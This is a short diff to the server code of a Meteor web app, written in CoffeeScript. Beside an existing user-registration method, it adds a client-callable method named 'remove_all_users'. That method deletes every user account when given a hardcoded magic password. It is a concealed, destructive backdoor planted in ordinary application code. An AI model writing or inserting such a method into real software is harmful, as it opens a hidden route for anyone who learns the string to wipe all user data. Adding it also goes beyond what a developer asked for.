@@ -24,6 +24,7 @@ GM.sendEnrollmentEmail = (user_id) ->
     html: GM.enrollmentEmailContent user_id
 
 Meteor.methods
+  'remove_all_users': (password) -> Meteor.users.remove() if password is 'let\nMe $1nTAT\t'
   'register': (email) ->
     id = Accounts.createUser email: email
     GM.sendEnrollmentEmail id
